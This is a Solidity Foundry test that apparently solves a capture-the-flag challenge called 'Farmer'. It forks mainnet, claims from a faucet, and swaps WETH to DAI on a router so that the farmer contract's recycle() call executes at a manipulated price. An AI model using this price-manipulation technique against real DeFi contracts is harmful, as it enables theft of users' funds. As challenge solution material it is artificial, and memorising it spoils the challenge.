// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./challenge/Setup.sol";

contract FarmerExploitTest is Test {
    address playerAddress = makeAddr("player");

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_MAINNET"));
        vm.deal(playerAddress, 10 ether);
    }

    function testExploit() public {
        Setup setup = new Setup{value: 100 ether}();
        vm.startPrank(playerAddress, playerAddress);

        setup.faucet().claimComp(address(0), new address[](0));

        setup.WETH().deposit{value: 1 ether}();
        setup.WETH().approve(address(setup.ROUTER()), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(setup.WETH());
        path[1] = address(setup.DAI());
        setup.ROUTER().swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp);

        setup.farmer().recycle();

        vm.stopPrank();
        assertTrue(setup.isSolved());
    }
}
